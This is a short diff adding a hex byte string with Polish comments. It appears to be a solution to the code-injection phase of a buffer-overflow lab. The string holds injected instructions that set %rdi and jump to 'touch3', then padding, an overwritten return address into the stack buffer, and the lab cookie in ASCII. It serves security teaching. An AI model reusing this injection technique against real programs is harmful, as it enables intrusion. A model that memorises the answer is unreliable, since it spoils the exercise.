@@ -1,0 +1,11 @@
+/* rsp: 0x556198f0 + 0x10 = 0x55619900 */
+48 c7 c7 00 99 61 55 68 /* mov 0x55619900, %rdi */
+1e 1d 40 00             /* pushq  $0x401d1e */
+c3                      /* ret */
+/* padding */
+00 00 00 00 00 00 00 00
+00 00 00
+d8 98 61 55 00 00 00 00 /* początek bufora: 0x556198D8 */
+1e 1d 40 00 00 00 00 00 /* touch3 adres */
+/* cookie (znakowa reprezentacja) 0x616c5c3d */
+36 31 36 63 35 63 33 64 00 /* zamienione przy pomocy man ascii */
